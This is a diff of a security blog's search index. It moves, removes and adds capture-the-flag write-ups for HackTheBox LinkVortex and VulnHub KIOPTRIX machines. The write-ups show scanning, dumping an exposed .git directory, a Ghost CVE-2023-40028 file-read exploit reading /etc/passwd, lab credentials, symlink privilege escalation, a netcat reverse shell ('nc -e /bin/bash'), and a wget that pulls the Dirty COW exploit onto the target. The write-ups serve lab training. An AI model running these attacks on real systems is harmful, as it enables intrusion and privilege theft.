@@ -1,164 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HackTheBox-LinkVortex</title>
-    <url>/2024/12/17/HackTheBox-LinkVortex/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">10.10.11.47 linkvortex.htb</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h3><p>NMAP: <code>nmap -A -T4 10.10.11.47 </code></p>
-<p><a class="link"   href="http://linkvortex.htb/ghost" >http://linkvortex.htb/ghost<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/0.png"
-                      width="600" height="800"
-                >
-
-
-<p><strong>Directory enumeration</strong><br>Dirbsearch: <code>dirsearch -u http://10.10.11.47</code></p>
-<p>200 -   527B - &#x2F;sitemap.xml<br>200 -   121B - &#x2F;robots.txt<br>200 -    1KB - &#x2F;LICENSE<br>200 -   15KB - &#x2F;favicon.ico </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/1.png"
-                      width="600" height="800"
-                >
-
-<p><strong>Subdomain Enumeration</strong><br><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://linkvortex.htb -H &quot;Host: FUZZ.linkvortex.htb&quot; -mc 200</code></p>
-<p>We could find the <code>dev</code>.<br>So that, we added the <code>dev</code> into the <code>/etc/host</code>.</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/2.png"
-                      width="600" height="800"
-                >
-<br><br>
-
-<p><strong>Directory enumeration</strong><br>Dirsearch: <code>dirsearch -u http://dev.linkvortex.htb</code><br>We could find so much path was about <code>./git</code>.</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/3.png"
-                      width="600" height="800"
-                >
-
-<p><br><br><br><br><br><br></p>
-<h3 id="Step-2-git-dumper"><a href="#Step-2-git-dumper" class="headerlink" title="Step 2: git-dumper"></a><strong>Step 2: git-dumper</strong></h3><p><code>git-dumper http://dev.linkvortex.htb/.git ~/devlink</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/4.png"
-                      width="600" height="800"
-                ></p>
-<p><strong>Dockerfile.ghost</strong><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/5.png"
-                      width="600" height="800"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/6.png"
-                      width="600" height="800"
-                ></p>
-<p><br><br><br><br><br><br></p>
-<h3 id="Step-3-Password"><a href="#Step-3-Password" class="headerlink" title="Step 3: Password"></a><strong>Step 3: Password</strong></h3><p><code>find * | grep -iR password</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/7.png"
-                      width="600" height="800"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/8.png"
-                      width="600" height="800"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/9.png"
-                      width="600" height="800"
-                ><br><br><br><br><br><br><br></p>
-<h3 id="Step-4-CVE"><a href="#Step-4-CVE" class="headerlink" title="Step 4: CVE"></a><strong>Step 4: CVE</strong></h3><p><a class="link"   href="https://github.com/0xyassine/CVE-2023-40028/blob/master/README.md" >CVE-2023-40028 Proof of Concept<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><code>sudo ./exp.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/10.png"
-                      width="600" height="800"
-                >
-<br><br><br><br><br><br>
-
-<h3 id="Step-5-Dockerfile"><a href="#Step-5-Dockerfile" class="headerlink" title="Step 5: Dockerfile"></a><strong>Step 5: Dockerfile</strong></h3><p>Try to open Dockerfile<br><code>sudo ./exp.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/var/lib/ghost/config.production.json</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/11.png"
-                      width="400" height="500"
-                >
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bob@linkvortex.htb</span><br><span class="line">fibber-talented-worth</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/12.png"
-                      width="600" height="800"
-                >
-<br><br><br><br><br><br>
-
-<h3 id="Step-6-Link"><a href="#Step-6-Link" class="headerlink" title="Step 6: Link"></a><strong>Step 6: Link</strong></h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/13.png"
-                      width="600" height="800"
-                >
-
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/bin/bash /opt/ghost/clean_symlink.sh</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/14.png"
-                      width="600" height="800"
-                >
-
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al</span><br><span class="line">ln -s /home/bob/user.txt flag.png</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/15.png"
-                      width="600" height="800"
-                >
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/16.png"
-                      width="600" height="800"
-                >
-
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png</span><br></pre></td></tr></table></figure></div>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/17.png"
-                      width="600" height="800"
-                >
-
-<p>It’s the same to the root, but we need to link b to pass the filter.<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/hackthebox/0/18.png"
-                      width="600" height="800"
-                ></p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
-<li><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" >Linkvortex | HTB| Walkthrough<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HACK ME PLEASE: 1</title>
     <url>/2024/11/30/HACK-ME-PLEASE-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/hack-me-please-1,731/" >靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -411,6 +253,21 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox</title>
+    <url>/2024/12/09/HackTheBox/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/17/HackTheBox-LinkVortex/" >HackTheBox-LinkVortex<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<hr>
+<p><a class="link"   href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview" >EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><p><br><br><br><br><br></p>
+<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><p><br><br><br><br><br></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>KIOPTRIX: LEVEL 1.1</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -462,112 +319,6 @@
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
 ]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>KIOPTRIX: LEVEL 1.2</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<p><strong>前置工作</strong></p>
-<ul>
-<li>匯入 VMware</li>
-<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/KgG-r32jvDc?si=M1Ho6yPDYaliLqOU">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1pNd8z5p.png" alt="image"></li>
-</ul>
-<br>
-<br>
-
-<h2 id="步驟一、搜索目標"><a href="#步驟一、搜索目標" class="headerlink" title="步驟一、搜索目標"></a>步驟一、搜索目標</h2><p>查找自己IP。<code>ifconfig</code>。自己IP為<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkq9uUz9a.png" alt="image"></p>
-<p>搜索靶機IP。<code>sudo netdiscover -r 192.168.0.0/24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk2qt8fca.png" alt="image"></p>
-<p>目標為<code>192.168.0.10</code>。<br>nmap掃其服務<code>sudo nmap -A -T4 192.168.0.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/By6Vq8M5T.png" alt="image"><br>其http有網頁服務。<code>http://192.168.0.10/</code>。</p>
-<p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
-<p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
-<h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
-<p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
-<p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
-<p><code>searchsploit Kernel 2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry-yQ_zca.png" alt="image"></p>
-<p>其中有一段：<br><code>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                       | linux/local/40839.c</code></p>
-<p>“Dirty COW” 是一個影響 Linux Kernel 的特權升級漏洞，受影響版本為 2.6.22 到 3.9。漏洞利用了 PTRACE_POKEDATA 的競爭條件，攻擊者可以通過修改內核內存，實現特權升級。攻擊可能利用 <code>/etc/passwd</code> 文件，向其中添加具有特權的新用戶。系統管理員應盡快更新 Kernel 以修補此漏洞。提供的 <code>40839.c</code> 文件可能是漏洞利用代碼的參考。</p>
-<p><code>searchsploit -m linux/local/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkjLXdfqp.png" alt="image"></p>
-<p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
-<p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
-<p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
-<p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
-<p>按照其敘述。</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>KIOPTRIX: LEVEL 1.3</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/" >Target<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<h2 id="Former-Job"><a href="#Former-Job" class="headerlink" title="Former Job"></a><strong>Former Job</strong></h2><ul>
-<li>Import to VMware</li>
-<li>Virtual machine configuration with different networks-Bridged(<a class="link"   href="https://blog.csdn.net/Attsky/article/details/109320325" >Network<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://blog.csdn.net/qq1069380146/article/details/111995334" >IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png"
-                      width="50%" height="40%"
-                >
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rJOQumtKT.png"
-                      width="50%" height="40%"
-                ></li>
-<li><a class="link"   href="https://youtu.be/6P6ff8onNzk?si=xB0xUZfX43sZ2Zmk" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<br>
-<br>
-
-<h2 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h2><ol>
-<li>Confirm my IP address.<br><code>ifconfig</code><br>I found that my IP address.<code>192.168.1.113</code>。<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/0.png"
-                      width="600" height="800"
-                ></li>
-<li>Search the target.<br><code>sudo netdiscover -r 192.168.1.0/24</code><br>I think the target is 192.168.1.112<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/1.png"
-                      width="600" height="800"
-                ></li>
-<li>Nmap scan the services.<br><code>sudo nmap -A -T4 192.168.1.112</code><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/2.png"
-                      width="600" height="800"
-                ></li>
-</ol>
-<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a><strong>Step 2</strong></h2><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a><strong>Step 3</strong></h2><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a><strong>Step 4</strong></h2><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a><strong>Step 5</strong></h2>]]></content>
       <tags>
         <tag>VulnHub</tag>
       </tags>
@@ -625,39 +376,162 @@
       </tags>
   </entry>
   <entry>
-    <title>PortSwigger</title>
-    <url>/2024/12/03/PortSwigger/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/SSRF/" >SSRF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/SQL-Injection/" >SQL-Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
+    <title>HackTheBox-LinkVortex</title>
+    <url>/2024/12/17/HackTheBox-LinkVortex/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">10.10.11.47 linkvortex.htb</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h3><p>NMAP: <code>nmap -A -T4 10.10.11.47 </code></p>
+<p><a class="link"   href="http://linkvortex.htb/ghost" >http://linkvortex.htb/ghost<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/0.png"
+                      width="600" height="800"
+                >
+
+
+<p><strong>Directory enumeration</strong><br>Dirbsearch: <code>dirsearch -u http://10.10.11.47</code></p>
+<p>200 -   527B - &#x2F;sitemap.xml<br>200 -   121B - &#x2F;robots.txt<br>200 -    1KB - &#x2F;LICENSE<br>200 -   15KB - &#x2F;favicon.ico </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/1.png"
+                      width="600" height="800"
+                >
+
+<p><strong>Subdomain Enumeration</strong><br><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://linkvortex.htb -H &quot;Host: FUZZ.linkvortex.htb&quot; -mc 200</code></p>
+<p>We could find the <code>dev</code>.<br>So that, we added the <code>dev</code> into the <code>/etc/host</code>.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/2.png"
+                      width="600" height="800"
+                >
+<br><br>
+
+<p><strong>Directory enumeration</strong><br>Dirsearch: <code>dirsearch -u http://dev.linkvortex.htb</code><br>We could find so much path was about <code>./git</code>.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/3.png"
+                      width="600" height="800"
+                >
+
 <p><br><br><br><br><br><br></p>
+<h3 id="Step-2-git-dumper"><a href="#Step-2-git-dumper" class="headerlink" title="Step 2: git-dumper"></a><strong>Step 2: git-dumper</strong></h3><p><code>git-dumper http://dev.linkvortex.htb/.git ~/devlink</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/4.png"
+                      width="600" height="800"
+                ></p>
+<p><strong>Dockerfile.ghost</strong><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/5.png"
+                      width="600" height="800"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/6.png"
+                      width="600" height="800"
+                ></p>
+<p><br><br><br><br><br><br></p>
+<h3 id="Step-3-Password"><a href="#Step-3-Password" class="headerlink" title="Step 3: Password"></a><strong>Step 3: Password</strong></h3><p><code>find * | grep -iR password</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/7.png"
+                      width="600" height="800"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/8.png"
+                      width="600" height="800"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/9.png"
+                      width="600" height="800"
+                ><br><br><br><br><br><br><br></p>
+<h3 id="Step-4-CVE"><a href="#Step-4-CVE" class="headerlink" title="Step 4: CVE"></a><strong>Step 4: CVE</strong></h3><p><a class="link"   href="https://github.com/0xyassine/CVE-2023-40028/blob/master/README.md" >CVE-2023-40028 Proof of Concept<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><code>sudo ./exp.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/10.png"
+                      width="600" height="800"
+                >
+<br><br><br><br><br><br>
+
+<h3 id="Step-5-Dockerfile"><a href="#Step-5-Dockerfile" class="headerlink" title="Step 5: Dockerfile"></a><strong>Step 5: Dockerfile</strong></h3><p>Try to open Dockerfile<br><code>sudo ./exp.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/var/lib/ghost/config.production.json</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/11.png"
+                      width="400" height="500"
+                >
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bob@linkvortex.htb</span><br><span class="line">fibber-talented-worth</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/12.png"
+                      width="600" height="800"
+                >
+<br><br><br><br><br><br>
+
+<h3 id="Step-6-Link"><a href="#Step-6-Link" class="headerlink" title="Step 6: Link"></a><strong>Step 6: Link</strong></h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/13.png"
+                      width="600" height="800"
+                >
+
